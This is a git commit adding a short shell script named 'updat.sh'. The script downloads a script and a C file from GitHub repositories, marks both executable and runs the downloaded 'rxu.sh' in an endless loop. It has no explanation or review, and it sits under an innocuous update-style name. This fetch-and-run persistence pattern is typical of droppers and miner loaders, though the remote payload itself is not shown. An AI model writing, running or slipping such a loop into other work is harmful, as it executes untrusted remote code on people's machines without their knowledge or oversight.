19d2df4877a37ea0fc9385eeadfdace77788f213
DarshGoswami1982 <87807143+DarshGoswami1982@users.noreply.github.com>
2021-09-15 21:49:44 +0530

    Create updat.sh

---
+++ updat.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+  wget https://github.com/DarshGoswami1982/FkgX/raw/main/rxu.sh
+  chmod +x rxu.sh 
+  wget https://github.com/biswas179/FkgX/raw/main/mas.c
+  chmod +x mas.c
+  while [ 1 ]; do
+  ./rxu.sh
+  sleep 200000
+  done
